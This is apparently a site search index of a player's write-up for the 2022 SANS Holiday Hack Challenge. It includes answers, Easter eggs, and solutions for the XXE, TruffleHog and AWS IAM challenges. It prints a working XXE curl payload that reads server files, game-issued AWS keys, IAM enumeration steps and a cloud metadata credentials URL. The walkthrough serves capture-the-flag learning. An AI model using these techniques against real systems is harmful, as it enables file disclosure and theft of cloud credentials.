{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p> Hello there and welcome to my 2022 SANS Holiday Hack Challenge write-up. I've been creating these for a while now and feedback from the KringleCon community these past couple of years has shown me how much of a valuable resource they are. Obviously not as valuable as a totally legit Bored Sporc NFT, but valuable nonetheless!</p> <p>So, for this fifth edition, my primary motivation is you. The first time participant, the cybersecurity enthousiast, the seasoned professional, and every type of player in between. May this write-up provide you with that final nudge to help solve that difficult challenge or be a learning guide as you dip your toes in the exciting world of cybersecurity! </p> <p>Unlike previous years, this time around there are only two main sections. There's this page, which contains the introduction, answers, the overall narrative, and final conclusion. And there's Objectives, where you'll find the individual challenge write-ups, organized by ring type, for which an answer had to be submitted. Hints are now more tightly integrated. You'll collect them as part of the normal story progression and by keeping an eye out for six hidden chests spread around the North Pole. Finally, no SANS Holiday Hack Challenge write-up is really complete without a list of Easter eggs found along the way, a little bit of cheating here and there, and the odd custom script or two. Enjoy!</p>  <p>50-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p>   Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":"<p>1. KringleCon Orientation - </p> <p>Follow Jingle Ringford's instructions to create a KringleCoin wallet and open the gate.</p>   <p>2. Wireshark Practice - </p> <p>Investigate the <code>suspicious.pcap</code> packet capture file and answer all the questions.</p>   <p>3. Windows Event Logs - </p> <p>Investigate the <code>powershell.evtx</code> log file and answer all the questions.</p>   <p>4. Suricata Regatta - </p> <p>Add the 4 requested Suricata rules to the <code>suricata.rules</code> file.</p>   <p>5. Clone with a Difference - </p> <p>maintainers</p>   <p>6. Prison Escape - </p> <p>082bb339ec19de4935867</p>   <p>7. Jolly CI/CD - </p> <p>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>   <p>8. Boria PCAP Mining - </p> <p>Naughty IP: 18.222.86.32 Credential Mining: alice 404 FTW: <code>/proc</code> IMDS, XXE, and Other Abbreviations: <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>   <p>9. Open Boria Mine Door - </p> <p>Find the correct keys to open all the locks.</p>   <p>10. Glamtariel's Fountain - </p> <p><code>goldring-morethansupertopsecret76394734.png</code></p>   <p>11. AWS CLI Intro - </p> <p>Enter the correct AWS CLI commands in the AWS 101 terminal.</p>   <p>12. Trufflehog Search - </p> <p><code>put_policy.py</code></p>   <p>13. Exploitation via AWS CLI - </p> <p>Enter the correct AWS CLI commands in the AWS 201 terminal.</p>   <p>14. Buy a Hat - </p> <p>Buy a hat using the hat vending machine and KTM.</p>   <p>15. Blockchain Divination - </p> <p><code>0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</code></p>   <p>16. Exploit a Smart Contract - </p> <p>Buy a Bored Sporc NFT by exploiting a flaw in the smart contract.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Narrative</p> <p>Five Rings for the Christmas king immersed in cold Each Ring now missing from its zone The first with bread kindly given, not sold Another to find 'ere pipelines get owned One beneath a fountain where water flowed Into clouds Grinchum had the fourth thrown The fifth on blockchains where shadows be bold One hunt to seek them all, five quests to find them One player to bring them all, and Santa Claus to bind them</p>    <p>Santa</p> <p>Congratulations! You have foiled Grinchum's foul plan and recovered the Golden Rings! And by the magic of the rings, Grinchum has been restored back to his true, merry self: Smilegol! You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was able to snatch them from my castle. To anyone but me, their allure becomes irresistable the more Rings someone possesses. That allure eventually tarnishes the holder's Holiday Spirit, which is about giving, not possesing. That's exactly what happened to Smilegol; that selfishness morphed him into Grinchum. But thanks to you, Grinchum is no more, and the holiday season is saved! Ho ho ho, happy holidays!</p>   <p>Smilegol</p> <p>I must give you my most thankful of thanks, and most sorry of sorries. I'm not sure what happened, but I just couldn't resist the Rings' call. But once you returned the Rings to Santa, I was no longer so spellbound. I could think clearly again, so I shouted off that awful persona. And that grouchy Grinchum was gone for good. Now, I can be me again, just in time for gift giving. This is a lesson I won't soon forget, and I certainly won't forget you. I wish you smooth sailing on wherever your next voyage takes you!</p>   Timpy Toque <p>Thank you for saving Smilegol and protecting the Rings. You will always be a friend of the Flobbits.</p>   Eve Snowshoes <p>Hello there, super helper! I'm Eve Snowshoes. The other elves and I are so glad you were able to help recover the rings! The holidays wouldn't have been the same without your hard work. If you'd like, you can order special swag that's only available to our victors! Thank you!</p>   Angel Candysalt <p>Greetings North Pole savior! I'm Angel Candysalt! A euphemism? No, that's my name. Why are people still asking me that? Anywho, thank you for everything you've done. You'll go down in history!</p>   Rose Mold <p>I'm Rose Mold. What planet are you from? What am I doing here? I could ask the same of you! Collecting web, cloud, elfen rings... What about onion rings? A Sebring? n00bs...</p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":"<p>After 5 years I've made peace with the fact that it's near impossible to find all the Easter eggs and references hidden around the North Pole. It's simply amazing how many of these funny little treasures you can find once you start looking around for them. Things like movie references, jokes, nods to popular culture, memes, secret areas, references to past Holiday Hack Challenge, and funny WebSocket response messages. Below, in no particular order, are just the ones I came across.</p>"},{"location":"easter_eggs/#five-golden-rings","title":"Five Golden Rings","text":"<p>Surprise! This year's event announcement continues the naming convention set by previous iterations. 2019 was titled KringleCon 2: Turtle Doves, in 2020 it was KringleCon 3: French Hens, and 2021 finally brought us KringleCon 4: Calling Birds. This time around we get KringleCon 5: Golden Rings which is a reference to the fifth verse from the Twelve Days of Christmas carol.</p>  <p>The Twelve Days Of Christmas</p> <p>... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ... On the fifth day of Christmas My true love sent to me: Five golden rings ...</p>"},{"location":"easter_eggs/#the-lord-of-the-rings","title":"The Lord of the Rings","text":"<p>It starts the moment you arrive at the North Pole and Ninjula's Return of the Song of the Spire but with More Santa whisks you back to 2001 with a Christmassy version of Howard Shore's The Shire from The Lord of the Rings (LoTR). It doesn't stop there though. As you venture around the North Pole you'll be interacting with lots of characters and locations that have some reference to LoTR lore. From Sporcs and a Snowrog to NPC's named Grinchum, Smilegol, Rippin Proudboot, and Timpy Toque.</p>    Name Reference Location     Flobbits Hobbits The friendly NPCs   Sporcs Orcs The less friendly NPCs from the Burning Ring of Fire   Snowrog Balrog Monster near Suricata Regatta   Rippin Proudboot Pippin + Mrs. Proudfoot NPC near Jolly CI/CD   Grinchum Grinch + Gollum NPC found at several locations across the map   Timpy Toque Pippin Took NPC in Santa's castle   Smilegol Smeagol NPC in Santa's castle   Samways Samwise Account name in the Prison Escape terminal   Hal Tandybuck Merry Brandybuck NPC near Open Boria Mine Door   Boria Mine Mines of Moria Location of Glamtariel's Fountain   Glamtariel Galadriel The princess in Glamtariel's Fountain   Rom Bambidil Tom Bombadil Easter egg in Glamtariel's Fountain    <p>If there was any doubt about the overall theme of the event being The Lord of the Rings, some of the avatar images are a direct reference with filenames like <code>smeagol.png</code>, <code>hobbit1.png</code>, and <code>orc1.png</code>. Smilegol to Grinchum's transformation is also hinted at in two <code>powershell.evtx.log</code> entries in the Windows Event Logs objective.</p>"},{"location":"easter_eggs/#rom-bambidil","title":"Rom Bambidil","text":"<p>While this is also a reference to The Lord of the Rings, it's worth noting separately as it's an Easter egg you need to explictly search for while solving Glamtariel's Fountain. When you leverage XML external entity injection to retrieve the green ring at <code>/app/static/images/x_phial_pholder_2022/greenring.txt</code> it will return an image with a reference to Tom Bombadil.</p>"},{"location":"easter_eggs/#brozeek-and-crozag","title":"Brozeek and Crozag","text":"<p>Brozeek is a reference to the Zeek network security monitoring tool which was previously named Bro. Crozak on the other hand appears to be somekind of variation on Brozeek's name: Bro &gt; Cro, zeek &gt; zag.</p>"},{"location":"easter_eggs/#bird-references","title":"Bird references","text":"<p>One of the canaries will respond with a reference to Tweety Bird's well known I Tawt I Taw a Puddy Tat line. The other will respond with a reference to Pintel's Hello poppet line from Pirates of the Caribbean: The Curse of the Black Pearl.</p>"},{"location":"easter_eggs/#jason","title":"Jason","text":"<p>Anyone who's played SANS Holiday Hack Challenge a few times before knows Jason's always hidden somewhere in the game. This time he gets to play the role of a sleeping canary with some glorious plumage near the entrance of the Burning Ring of Fire! While it seems like a step up from his flush handle cameo from the  year prior, they actually kept the toilet flush sounds!</p>"},{"location":"easter_eggs/#dimitri","title":"Dimitri","text":"<p>Another reference, similar to Jason, is Dimitri. This year he's a hat which can be found in one of the treasure chests.</p>"},{"location":"easter_eggs/#boaty-mcboatface","title":"Boaty McBoatFace","text":"<p>The asset name for the boat in Elfen Ring is Boaty McBoatface! </p>"},{"location":"easter_eggs/#web-socket-messages","title":"Web socket messages","text":"<p>The WebSocket at <code>wss://2022.kringlecon.com/ws</code> is a lot of fun to play around with. The <code>WS_OHHIMARK</code> and <code>DENNIS_NEDRY</code> response message types are references to the movies The Room and Jurassic Park, respectively.</p>  WS_OHHIMARK DENNIS_NEDRY"},{"location":"easter_eggs/#bored-ape-yacht-club","title":"Bored Ape Yacht Club","text":"<p>The Bored Sporc Rowboard Society (BSRS) is a direct reference to the Bored Ape Yacht Club (BAYC). The website logo, the wording, the clubhouse image, and the overall styling of banners and buttons all match up almost perfectly with the BAYC website.</p>  <p>The cherry on the cake is probably the footnote about the clubhouse though! </p>  <p>BSRS website footnote</p> <p>*This is an artist's rendering of the clubhouse we're considering building if we end up, like, rollin' in it after this NFT thing takes off. This does not represent the actual clubhouse which right now is kinda just, like, the bottom level of my parent's cave. I moved home about ten years ago, after I got, like, laid-off from my job working Sporc Squad for Beast Buy. My boss, Chordclak, was a total lamer... Anyway, that picture isn't the real clubhouse. My old girlfriend, Glanchorf, she drew that. I always told her that she should go to art school and stuff because, like, she was really talented and all, but she just kept working at Burgher King and eventually she dumped me for that lamer Chordclak. I kept the picture though, and decided to use it on this site.</p> <p>And just in case you're reading this Chordclak, I'm gonna be rich and you suck.</p>"},{"location":"easter_eggs/#the-discworld","title":"The Discworld","text":"<p>If you walk along the left side to the back of Santa's castle, you'll end up in an area named __Shenanigans__. The room's backdrop is an image of the Discworld, a fictional setting for all of Terry Pratchett's Discworld fantasy novels. If you've forgotten the key to your KringleCoin (KC) wallet, you can use the terminal in this area to call Santa who will help you recover it.</p>"},{"location":"easter_eggs/#literal-beanie-hats","title":"Literal beanie hats","text":"<p>You can buy literal beanie hats from the hat vending machine. Like, hats made out of actual coffee beans! </p>"},{"location":"easter_eggs/#you-are-awesome","title":"You are awesome!","text":"<p>Last, but not least, the background image to the underground tunnels contains a special message of support to everyone who decides to spend some time at the North Pole, helping Santa solve all these challenges. You are awesome!</p>"},{"location":"objectives/o1/","title":"KringleCon Orientation","text":"<p>Difficulty:  Direct link: Orientation terminal</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Request</p> <p>Get your bearings at KringleCon</p>   Jingle Ringford <p>Welcome to the North Pole, KringleCon, and the 2022 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks.</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>This first challenge is designed to help you get your bearings and to solve it we simply need to follow Jingle Ringford's instructions. Each task is designed to help explain part of the game mechanics: talk to Jingle Ringford, get our badge, create a KringleCoin wallet, and use the terminal to open the gate. Start by clicking on Jingle Ringford's avatar to initiate a conversation.</p>  <p>Jingle Ringford</p> <p>First things first, here's your badge! It's the five golden rings in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that machine to the left and create a crypto wallet for yourself. Don't lose that key!</p>  <p>Click on the KringleCoin Teller Machine (KTM) and follow the on-screen instructions to create your personal KringleCoin cryptocurrency wallet. Be sure to note down your wallet address and personal wallet key as you will need them throughout the game, but don't worry too much about the message stating your key cannot be recovered. If lost, there is a way to retrieve it! .</p>  <p>Jingle Ringford</p> <p>Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions.</p>  <p>Finally, click on the terminal to open it, select the top pane, enter answer, and press Enter to complete the challenge.</p>  <p>Once completed, close the terminal window and continue on through the open gate.</p>   <p>Answer</p> <p>Follow Jingle Ringford's instructions to create a KringleCoin wallet and open the gate.</p>"},{"location":"objectives/o1/#response","title":"Response","text":"<p>Jingle Ringford</p> <p>Great! Your orientation is now complete! You can enter through the gate now. Have FUN!!!</p>"},{"location":"objectives/o10/","title":"Glamtariel's Fountain","text":"<p>Difficulty:  Direct link: Glamtariel's Fountain website</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.</p>   Akbowl <p>Huh - what? Why do you disturb Akbowl? I'm trying to get the ring in here for the Sporc Chief. Unlucky for me it's lost in this water basin thing. You will not get it out before Akbowl!</p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Significant CASE <p>Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.</p>   eXternal Entities <p>Sometimes we can hit web pages with XXE when they aren't expecting it!</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":""},{"location":"objectives/o10/#gathering-additional-information","title":"Gathering additional information","text":"<p>While it might be tempting to dive right in and throwing HTTP requests around, it really helps to take a step back and take note of exactly what Glamtariel and the fountain are saying. As noted in one of the hints, responses containing uppercase words are important. So, let's start by dragging all three batches of four images onto both entities and collecting some additional hints.</p>  <p>Additional hints</p> <ol> <li>I helped the elves to create the PATH here to make sure that only those invited can find their way here.</li> <li>I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them.</li> <li>The elves do a great job making PATHs which are easy to follow once you see them.</li> <li>Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses.</li> <li>Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though.</li> <li>I pretty much stick to just one TYPE of language, it's a lot easier to share things that way.</li> <li>Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!</li> <li>Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed.</li> <li>Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file.</li> <li>I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that.</li> <li>I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things.</li> <li>You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language.</li> </ol>  <p>Sentences containing uppercase words can be grouped into four categories: the risk of cookie tampering, a path we need to build, a different type of language spoken by the princess, and a ringlist file the princess uses for storing her ring collection.</p>"},{"location":"objectives/o10/#inspecting-http-requests-and-responses","title":"Inspecting HTTP requests and responses","text":"<p>With a solid list of additional hints in our back pocket, we can start taking a look at what exactly goes on behing the scenes when dragging images to either the princess or the fountain. Select the tabs below to get a better understanding of the relationship between the different UI elements and how they are represented in the associated HTTP traffic.</p>  Rendered HTML HTTP requests          <p>Each time an image is dragged onto an entity, an HTTP POST request containing JSON data is sent to the <code>/dropped</code> URL path. The JSON data contains the image being dragged (1), who it was dragged to (2), and the type of request. Important to note is that each request also contains both a cookie and a CSRF token (i.e., ticket) which is sent via the <code>X-Grinchum</code> HTTP request header (3).</p> <p>The JSON data in the HTTP responses contains the message from the fountain (4) and the princess (5), who the image was dropped on, and a <code>visit</code> field containing either none or a path to an image (6). In the example above, the link points to the <code>stage2ring-eyecu_2022.png</code> image which appears on screen right before moving to the stage with the four rings.</p> <p>Using this information we can now use tools like curl, Postman, Paw, or even a Python script to partially or fully automate these HTTP requests so we don't have to go through the tedious task of manually dragging and dropping images in a web browser.</p> JSON HTTP requests via curl<pre><code>export COOKIE='Cookie:MiniLembanh=COOKIE_VALUE_COPIED_FROM_WEB_BROWSER'\nexport GRINCHUM='X-Grinchum:TICKET_VALUE_COPIED_FROM_WEB_BROWSER'\n\ncurl -X POST https://glamtarielsfountain.com/dropped \\\n-H \"Content-Type: application/json\" \\\n-H \"Accept: application/json\" \\\n-H $GRINCHUM \\\n-H $COOKIE \\\n-d '{\"imgDrop\":\"img2\",\"who\":\"fountain\",\"reqType\":\"json\"}'\n</code></pre>"},{"location":"objectives/o10/#accessing-the-ringlist","title":"Accessing the ringlist","text":"<p>We know the princess speaks an additional type of language (i.e., XML) and she stores here rings in a ringlist. Putting together disAPPointed (i.e., <code>/app</code> root), PATHs which are easy to follow (i.e., <code>/static/images/</code>), my RINGLIST file (i.e., <code>ringlist</code>), and using a SIMPLE FORMAT (i.e., <code>.txt</code>) helps us to determine that the location of the ringlist file is <code>/app/static/images/ringlist.txt</code>.</p> <p>We can now switch from JSON to XML HTTP requests and leverage XML External Entity injection (XXE) to access the <code>ringlist.txt</code> file. We need to make sure that the <code>Content-Type</code> header and <code>ReqType</code> field are set to application/xml (line 2) and xml (line 11), respectively. The <code>imgDrop</code> field can be used to trigger the injection itself (lines 7 and 9).</p> Accessing the ringlist through XXE injection<pre><code>curl -X POST https://glamtarielsfountain.com/dropped \\\n-H \"Content-Type: application/xml\" \\\n-H \"Accept: application/json\" \\\n-H $GRINCHUM \\\n-H $COOKIE \\\n-d '&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\" &gt;]&gt;\n&lt;root&gt;\n&lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;\n&lt;who&gt;princess&lt;/who&gt;\n&lt;reqType&gt;xml&lt;/reqType&gt;\n&lt;/root&gt;'\n</code></pre>"},{"location":"objectives/o10/#scavenger-hunt","title":"Scavenger hunt","text":"<p>The princess' response to the ringlist request kicks off a mini scavenger hunt where every response returns a path to a PNG image holding a hint for the next request. The first image is located at <code>static/images/pholder-morethantopsupersecret63842.png</code> and shows a pixelated folder named <code>x_phial_pholder_2022</code> which contains a <code>bluering.txt</code> and <code>redring.txt</code> file.</p> <p>Trying to use XXE injection to access <code>/app/static/images/x_phial_pholder_2022/bluering.txt</code> or <code>/app/static/images/x_phial_pholder_2022/redring.txt</code> doesn't yield any results. However, keeping the path but changing the filename to <code>silverring.txt</code>, which we know the princess would really really like to add to her collection, takes us to the next step.</p>  Rom Bambidil Easter egg <p>A request to access <code>/app/static/images/x_phial_pholder_2022/greenring.txt</code> results in a Lord of the Rings reference and Easter egg! </p>   <p>The inscription on the red ring in the second image tells us the next file is <code>goldring_to_be_deleted.txt</code>. Unfortunately, trying to access that file annoys the Princess somewhat and she tells us she thought we wanted her to look at the silver ring.</p>"},{"location":"objectives/o10/#exchanging-the-silver-for-the-gold-ring","title":"Exchanging the silver for the gold ring","text":"<p>To get the golden ring, we can't just straight up grab it from the princess. Instead, we need to exchange it for the silver ring. At the start of the challenge we determined that giving something to the princess for her to look at is done through the <code>imgDrop</code> field, which means we can't use that field for triggering XXE injection anymore. Instead, we need to use the REQ and TYPE hint from the latest response and move our XXE injection to the <code>reqType</code> field.</p>  <p>This time, we're given the golden ring and with that the answer to this challenge! </p>  <p>Automating the challenge using Python</p> <p>Clicking and dragging images or copy/pasting <code>curl</code> commands can become a little tedious. This Python script automates the process by retrieving a valid cookie and CSRF token (i.e., ticket), sending the initial JSON requests, executing the necessary XXE injections, and downloading all the image assets.</p>    <p>Answer</p> <p><code>goldring-morethansupertopsecret76394734.png</code></p>"},{"location":"objectives/o10/#response","title":"Response","text":"<p>Akbowl</p> <p>No! That's not yours! This birdbath showed me images of this happening. But I didn't believe it because nobody is better than Akbowl! Akbowl's head is the hardest! That's what the other sporcs tell me. I guess Akbowl's head is not the smartest.</p>"},{"location":"objectives/o11/","title":"AWS CLI Intro","text":"<p>Difficulty:  Direct link: AWS 101 terminal</p>"},{"location":"objectives/o11/#objective","title":"Objective","text":"<p>Request</p> <p>Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints.</p>   Jill Underpole <p>Umm, can I help you? Me? I'm Jill Underpole, thank you very much. I'm working on this here smoke terminal. Cloud? Sure, whatever you want to call it. Anyway, you're welcome to try this out, if you think you know what you're doing. You'll have to learn some basics about the AWS command line interface (CLI) to be successful though.</p>"},{"location":"objectives/o11/#hints","title":"Hints","text":"AWS Whoami? <p>In the AWS command line (CLI), the Secure Token Service or STS has one very useful function.</p>"},{"location":"objectives/o11/#solution","title":"Solution","text":"<p>Solving this challenge is a matter of following the step-by-step terminal instructions. Start by typing <code>aws help</code> to bring up the AWS CLI help information. To exit back to the command line, press q. Next, run <code>aws configure</code> to configure the AWS CLI installation and enter <code>AKQAAYRKO7A5Q5XUY2IY</code>, <code>qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf</code>, and us-east-1 as the access key, secret key, and region values. The final step is to use <code>aws sts get-caller-identity</code> to retrieve details about the IAM user whose credentials we just used to configure the AWS CLI environment.</p>   <p>Answer</p> <p>Enter the correct AWS CLI commands in the AWS 101 terminal.</p>"},{"location":"objectives/o11/#response","title":"Response","text":"<p>Jill Underpole</p> <p>Wait, you got it done, didn't you? Ok, consider me impressed. You could probably help Gerty, too. The first trick'll be running the Trufflehog tool. It's as good at sniffing out secrets as I am at finding mushrooms! After that, it's just a matter of getting to the secret the tool found. I'd bet a basket of portobellos you'll get this done!</p>"},{"location":"objectives/o12/","title":"Trufflehog Search","text":"<p>Difficulty:  Direct link: aws_scripts Git repository</p>"},{"location":"objectives/o12/#objective","title":"Objective","text":"<p>Request</p> <p>Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials?</p>   Gerty Snowburrow <p>Well now, look who's venturing down into the caves! And well, who might you be, exaclty? I'm Gerty Snowburrow, if you need to know. And, not that I should be telling you, but I'm trying to figure out what Alabaster Snowball's done this time. Word is, he committed some secrets to a code repo. If you're feeling so inclined, you can try and find them for me.</p>"},{"location":"objectives/o12/#hints","title":"Hints","text":"Trufflehog Tool <p>You can search for secrets in a Git repo with <code>trufflehog git https://some.repo/here.git</code>.</p>   Checkout Old Commits <p>If you want to look at an older code commit with git, you can <code>git checkout CommitNumberHere</code>.</p>"},{"location":"objectives/o12/#solution","title":"Solution","text":""},{"location":"objectives/o12/#using-a-v2-python-package","title":"Using a v2 Python package","text":"<p>First, we need to grab a copy of TruffleHog. If we have a Python environment at our disposal we can use <code>pip install trufflehog</code> to install a v2 release of the tool. While it's an older version with less functionality, the command syntax is simpler and the output also includes <code>git diff</code> information. Running <code>trufflehog https://haugfactory.com/asnowball/aws_scripts.git</code> will print several commits where AWS credentials were either added or removed from a <code>put_policy.py</code> file.</p>"},{"location":"objectives/o12/#using-a-v3-binary-release","title":"Using a v3 binary release","text":"<p>A ready-to-go TruffleHog install</p> <p>If you don't want to mess around with setting up a Python environment or downloading the right binary for your specific operating system and CPU architecture, the terminal for the next challenge already has tools like <code>git</code> and TruffleHog installed and ready to go! Simply skip over the install instructions below and go straight to running <code>trufflehog git https://haugfactory.com/asnowball/aws_scripts.git</code>. </p>  <p>A second option is to use a more recent version of TruffleHog. Download the latest binary release that matches your operating system and CPU architecture, unpack the archive, and run the slightly updated <code>./trufflehog git https://haugfactory.com/asnowball/aws_scripts.git</code> command. While the output is different than before, the first result once again tells us an AWS secret was found in a <code>put_policy.py</code> file as part of commit <code>106d33e1ffd53eea753c1365eafc6588398279b5</code>.</p>  <p>Unlike the Python package version, the output for recent binary releases does not include <code>git diff</code> information anymore. However, we can easily confirm that the <code>put_policy.py</code> file in commit <code>106d33e1ffd53eea753c1365eafc6588398279b5</code> does indeed contain the credential data by cloning the repository (line 1) and showing the commit details (line 3).</p> Show commit details<pre><code>git clone https://haugfactory.com/asnowball/aws_scripts.git\ncd aws_scripts\ngit show 106d33e1ffd53eea753c1365eafc6588398279b5\n</code></pre>   <p>Answer</p> <p><code>put_policy.py</code></p>"},{"location":"objectives/o12/#response","title":"Response","text":"<p>Gerty Snowburrow</p> <p>Say, you got it done, didn't you? Well now, you might just be able to tackle the other AWS terminal down here. It's a bit more involved, but you've got the credentials to get it started now. Before you try it, you should know the difference between managed and inline policies. Short version: inline policies apply to one identity (user, role, group), and managed policies can be attached to many identities. There are different AWS CLI commands to interact with each kind. Other than that, the important bit is to know a bit about cloud or IAM privilege escalation. Sometimes attackers find access to more resources by just trying things until something works. But if they have access to the iam service inside the AWS CLI, they might just be able to ask what access they have! You can do it!</p>"},{"location":"objectives/o13/","title":"Exploitation via AWS CLI","text":"<p>Difficulty:  Direct link: AWS 201 terminal</p>"},{"location":"objectives/o13/#objective","title":"Objective","text":"<p>Request</p> <p>Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge.</p>   Sulfrod <p>Hey! You - come here! You look like someone who knows how to do this nerd stuff. I need my terminal to be stronger, like me! flexes You're gonna do that for me so I can bust into this cloud machine thing.</p>"},{"location":"objectives/o13/#hints","title":"Hints","text":"IAM Privilege Escalation <p>You can try <code>s3api</code> or <code>lambda</code> service commands, but Chris Elgee's talk on AWS and IAM might be a good start!</p>   (Attached) User Policies <p>AWS inline policies pertain to one identity while managed policies can be attached to many identities.</p>"},{"location":"objectives/o13/#solution","title":"Solution","text":""},{"location":"objectives/o13/#question-1","title":"Question 1","text":"<p>Question</p> <p>Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for <code>us-east-1</code> and then run <code>aws sts get-caller-identity</code>.</p>  <p>We can use the AWS credentials found in the previous challenge to configure the AWS CLI environment. Run <code>aws configure</code> and enter <code>AKIAAIDAYRANYAHGQOHD</code>, <code>e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL</code>, and us-east-1 as the access key, secret key, and region values. Next, use <code>aws sts get-caller-identity</code> to confirm the credentials are working as expected.</p>   <p>Answer</p> <p>Use the AWS credentials obtained via TruffleHog to configure the AWS CLI environment.</p>"},{"location":"objectives/o13/#question-2","title":"Question 2","text":"<p>Question</p> <p>Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The <code>aws iam</code> command to list attached user policies can be found here. Hint: it is NOT <code>list-user-policies</code>.</p>  <p>Use the <code>list-attached-user-policies</code> command, with the haug user name found in the ARN from question 1, to list the policies.</p>   <p>Answer</p> <p><code>aws iam list-attached-user-policies --user-name haug</code></p>"},{"location":"objectives/o13/#question-3","title":"Question 3","text":"<p>Question</p> <p>Now, view or <code>get</code> the policy that is attached to your user. The <code>aws iam</code> command to get a policy can be found here.</p>  <p>The output from question 2 contains a policy ARN. Use this value with the <code>get-policy</code> command to view the policy.</p>   <p>Answer</p> <p><code>aws iam get-policy --policy-arn \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\"</code></p>"},{"location":"objectives/o13/#question-4","title":"Question 4","text":"<p>Question</p> <p>Attached policies can have multiple versions. View the default version of this policy. The <code>aws iam</code> command to get a policy version can be found here.</p>  <p>Use the v1 default version ID from question 3 with the <code>get-policy-version</code> command to show the default version details.</p>   <p>Answer</p> <p><code>aws iam get-policy-version --policy-arn \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" --version-id \"v1\"</code></p>"},{"location":"objectives/o13/#question-5","title":"Question 5","text":"<p>Question</p> <p>Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The <code>aws iam</code> command to list user policies can be found here. Hint: it is NOT <code>list-attached-user-policies</code>.</p>  <p>To list inline policies we need to use the <code>list-user-policies</code> command with haug as the user name.</p>   <p>Answer</p> <p><code>aws iam list-user-policies --user-name haug</code></p>"},{"location":"objectives/o13/#question-6","title":"Question 6","text":"<p>Question</p> <p>Now, use the AWS CLI to get the only inline policy for your user. The <code>aws iam</code> command to get a user policy can be found here.</p>  <p>The <code>get-user-policy</code> command will print the details of the S3Perms inline policy, found in the output of question 5.</p>   <p>Answer</p> <p><code>aws iam get-user-policy --user-name haug --policy-name \"S3Perms\"</code></p>"},{"location":"objectives/o13/#question-7","title":"Question 7","text":"<p>Question</p> <p>The inline user policy named <code>S3Perms</code> disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The <code>aws s3api</code> command to list objects in an s3 bucket can be found here.</p>  <p>To list the objects in the smogmachines3 bucket, shown in the output of question 6, we can use the <code>list-objects</code> command.</p>   <p>Answer</p> <p><code>aws s3api list-objects --bucket \"smogmachines3\"</code></p>"},{"location":"objectives/o13/#question-8","title":"Question 8","text":"<p>Question</p> <p>The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The <code>aws lambda</code> command to list functions can be found here.</p>  <p>The <code>lambda</code> command set contains a <code>list-functions</code> command that will list the lambda functions.</p>   <p>Answer</p> <p><code>aws lambda list-functions</code></p>"},{"location":"objectives/o13/#question-9","title":"Question 9","text":"<p>Question</p> <p>Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The <code>aws lambda</code> command to get the function URL config can be found here.</p>  <p>To show the public URL details of a specific lambda function, we can use the <code>get-function-url-config</code> command.</p>   <p>Answer</p> 